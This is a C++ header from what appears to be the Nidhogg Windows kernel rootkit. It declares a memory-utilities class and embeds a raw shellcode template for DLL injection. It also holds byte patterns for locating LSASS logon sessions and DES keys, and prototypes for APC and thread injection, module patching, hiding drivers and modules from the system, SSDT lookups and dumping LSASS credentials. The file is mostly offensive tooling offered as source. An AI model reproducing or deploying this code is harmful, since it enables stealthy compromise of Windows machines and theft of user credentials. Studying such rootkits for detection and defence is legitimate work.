#pragma once

#include "pch.h"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

// Definitions.
constexpr SIZE_T MAX_HIDDEN_DRIVERS = 255;
constexpr SIZE_T ITEM_NOT_FOUND = MAX_HIDDEN_DRIVERS + 1;
constexpr SIZE_T NO_ACCESS = 0;
constexpr SIZE_T THREAD_PREVIOUSMODE_OFFSET = 0x232;
constexpr SIZE_T RETURN_OPCODE = 0xC3;
constexpr SIZE_T MOV_EAX_OPCODE = 0xB8;
constexpr SIZE_T PATH_OFFSET = 0x190;
constexpr SIZE_T DLL_INJ_SHELLCODE_SIZE = 704;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_BIT = 0x10;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_OFFSET = 0x74;
constexpr SIZE_T GUI_THREAD_FLAG_BIT = 0x80;
constexpr SIZE_T GUI_THREAD_FLAG_OFFSET = 0x78;
constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
constexpr UCHAR LogonSessionListLocation[] = {0xC1, 0xE1, 0x03, 0xE8, 0xCC, 0xCC, 0xCC , 0xFF};
constexpr UCHAR IvDesKeyLocation[] = { 0x21, 0x45, 0xD4, 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45, 0xD8 };

inline UCHAR shellcodeTemplate[DLL_INJ_SHELLCODE_SIZE] = {
	0x56, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20,
	0xE8, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF4, 0x5E, 0xC3, 0x66, 0x2E,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x53, 0xB9, 0xF0, 0x1D,
	0xD3, 0xAD, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x91, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x33, 0x48, 0x89, 0xC1, 0xBA, 0xDB, 0x2F, 0x07, 0xB7,
	0xE8, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3, 0xE8, 0x67, 0x02, 0x00,
	0x00, 0x48, 0x8D, 0x0D, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x59,
	0x02, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x48, 0x29, 0xD1, 0x48, 0x01,
	0xC1, 0x48, 0x89, 0xD8, 0x5B, 0xFF, 0xE0, 0x48, 0x83, 0xC4, 0x20, 0x5B,
	0xC3, 0x90, 0x90, 0x90, 0x49, 0x89, 0xD1, 0x49, 0x89, 0xC8, 0xBA, 0x05,
	0x15, 0x00, 0x00, 0x8A, 0x01, 0x4D, 0x85, 0xC9, 0x75, 0x06, 0x84, 0xC0,
	0x75, 0x16, 0xEB, 0x2F, 0x41, 0x89, 0xCA, 0x45, 0x29, 0xC2, 0x4D, 0x39,
	0xCA, 0x73, 0x24, 0x84, 0xC0, 0x75, 0x05, 0x48, 0xFF, 0xC1, 0xEB, 0x07,
	0x3C, 0x60, 0x76, 0x03, 0x83, 0xE8, 0x20, 0x41, 0x89, 0xD2, 0x0F, 0xB6,
	0xC0, 0x48, 0xFF, 0xC1, 0x41, 0xC1, 0xE2, 0x05, 0x44, 0x01, 0xD0, 0x01,
	0xC2, 0xEB, 0xC4, 0x89, 0xD0, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x57, 0x56, 0x48, 0x89, 0xCE, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48,
	0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48,
	0x8B, 0x78, 0x20, 0x48, 0x89, 0xFB, 0x0F, 0xB7, 0x53, 0x48, 0x48, 0x8B,
	0x4B, 0x50, 0xE8, 0x85, 0xFF, 0xFF, 0xFF, 0x89, 0xC0, 0x48, 0x39, 0xF0,
	0x75, 0x06, 0x48, 0x8B, 0x43, 0x20, 0xEB, 0x11, 0x48, 0x8B, 0x1B, 0x48,
	0x85, 0xDB, 0x74, 0x05, 0x48, 0x39, 0xDF, 0x75, 0xD9, 0x48, 0x83, 0xC8,
	0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5E, 0x5F, 0xC3, 0x41, 0x57, 0x41,
	0x56, 0x49, 0x89, 0xD6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xED, 0x57,
	0x56, 0x53, 0x48, 0x89, 0xCB, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x63, 0x41,
	0x3C, 0x8B, 0xBC, 0x08, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xCF, 0x44,
	0x8B, 0x7F, 0x20, 0x44, 0x8B, 0x67, 0x1C, 0x44, 0x8B, 0x6F, 0x24, 0x49,
	0x01, 0xCF, 0x39, 0x6F, 0x18, 0x76, 0x31, 0x89, 0xEE, 0x31, 0xD2, 0x41,
	0x8B, 0x0C, 0xB7, 0x48, 0x01, 0xD9, 0xE8, 0x15, 0xFF, 0xFF, 0xFF, 0x4C,
	0x39, 0xF0, 0x75, 0x18, 0x48, 0x01, 0xF6, 0x48, 0x01, 0xDE, 0x42, 0x0F,
	0xB7, 0x04, 0x2E, 0x48, 0x8D, 0x04, 0x83, 0x42, 0x8B, 0x04, 0x20, 0x48,
	0x01, 0xD8, 0xEB, 0x04, 0xFF, 0xC5, 0xEB, 0xCA, 0x48, 0x83, 0xC4, 0x28,
	0x5B, 0x5E, 0x5F, 0x5D, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F,
	0xC3, 0x90, 0x90, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83,
	0xE8, 0x05, 0xC3, 0x0F, 0x1F, 0x44, 0x00, 0x00
};

enum InjectionType {
	APCInjection,
	NtCreateThreadExInjection
};

struct DllInformation {
	InjectionType Type;
	ULONG Pid;
	CHAR DllPath[MAX_PATH];
};

struct ShellcodeInformation {
	InjectionType Type;
	ULONG Pid;
	ULONG ShellcodeSize;
	PVOID Shellcode;
	PVOID Parameter1;
	ULONG Parameter1Size;
	PVOID Parameter2;
	ULONG Parameter2Size;
	PVOID Parameter3;
	ULONG Parameter3Size;
};

struct PatchedModule {
	ULONG Pid;
	PVOID Patch;
	ULONG PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct HiddenModuleInformation {
	ULONG Pid;
	WCHAR* ModuleName;
};

struct HiddenDriverInformation {
	WCHAR* DriverName;
	bool Hide;
};

struct HiddenDriverItem {
	WCHAR* DriverName;
	PKLDR_DATA_TABLE_ENTRY originalEntry;
};

struct HiddenDriversList {
	FastMutex Lock;
	ULONG Count;
	ULONG LastIndex;
	HiddenDriverItem Items[MAX_HIDDEN_DRIVERS];
};

struct PkgReadWriteData {
	MODE Mode;
	ULONG Pid;
	SIZE_T Size;
	PVOID LocalAddress;
	PVOID RemoteAddress;
};

struct Credentials {
	WCHAR* Username;
	PVOID* EncryptedHash;
};

struct LsassInformation {
	PVOID IV;
	PVOID DesKey;
	ULONG Count;
	Credentials* Creds;
};

// Prototypes.
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);


class MemoryUtils {
private:
	HiddenDriversList hiddenDrivers;
	PSYSTEM_SERVICE_DESCRIPTOR_TABLE ssdt;
	tNtCreateThreadEx NtCreateThreadEx;

	bool AddHiddenDriver(HiddenDriverItem item);
	ULONG FindHiddenDriver(HiddenDriverItem item);
	bool RemoveHiddenDriver(HiddenDriverItem item);
	bool RemoveHiddenDriver(ULONG index);
	NTSTATUS VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress);
	TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode, EX_PUSH_LOCK* PageTableCommitmentLock);
	PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName);
	PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName);
	NTSTATUS FindAlertableThread(HANDLE pid, PETHREAD* Thread);
	NTSTATUS GetSSDTAddress();
	PVOID GetSSDTFunctionAddress(CHAR* functionName);

public:
	void* operator new(size_t size) {
		return ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	MemoryUtils();
	~MemoryUtils();

	NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode);
	NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode);
	NTSTATUS PatchModule(PatchedModule* ModuleInformation);
	NTSTATUS InjectShellcodeAPC(ShellcodeInformation* ShellcodeInformation);
	NTSTATUS InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo);
	NTSTATUS InjectDllThread(DllInformation* DllInfo);
	NTSTATUS InjectDllAPC(DllInformation* DllInfo);
	PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset);
	NTSTATUS HideModule(HiddenModuleInformation* ModuleInformation);
	NTSTATUS HideDriver(HiddenDriverInformation* DriverInformation);
	NTSTATUS UnhideDriver(HiddenDriverInformation* DriverInformation);
	NTSTATUS DumpCredentials(LsassInformation* LsassInformation);

	bool FoundNtCreateThreadEx() { return NtCreateThreadEx != NULL; }
	ULONG GetHiddenDrivers() { return this->hiddenDrivers.Count; }
};

inline MemoryUtils* NidhoggMemoryUtils;
